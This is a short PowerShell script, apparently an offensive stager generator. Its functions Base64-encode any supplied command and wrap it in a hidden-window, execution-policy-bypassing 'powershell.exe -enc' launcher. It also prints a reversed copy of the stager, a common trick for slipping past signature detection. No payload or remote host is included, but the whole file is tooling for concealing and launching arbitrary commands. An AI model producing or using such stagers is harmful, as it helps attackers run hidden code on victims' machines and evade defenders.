function Base64($command)
{
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
    return $enc
}


function DecodeBase64($enc)
{
    $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
    return $decode
}


function ReverseString($string)
{
    $stringarray = $string -split ""
    [array]::Reverse($stringarray)
    $reversestring = $stringarray -join ''
    return $reversestring
}


function GenerateStager($command)
{
    $base64command = Base64($command)
    $stager = "powershell.exe -windowstyle hidden -exec bypass -enc "  + $base64command
    $reversed_stager = ReverseString($stager)

    Write-Host ("Command to stage: `n" + $command + "`n")
    Write-Host ("Stager: `n" + $stager + "`n")
    Write-Host ("Reversed Stager: `n" + $reversed_stager + "`n")
}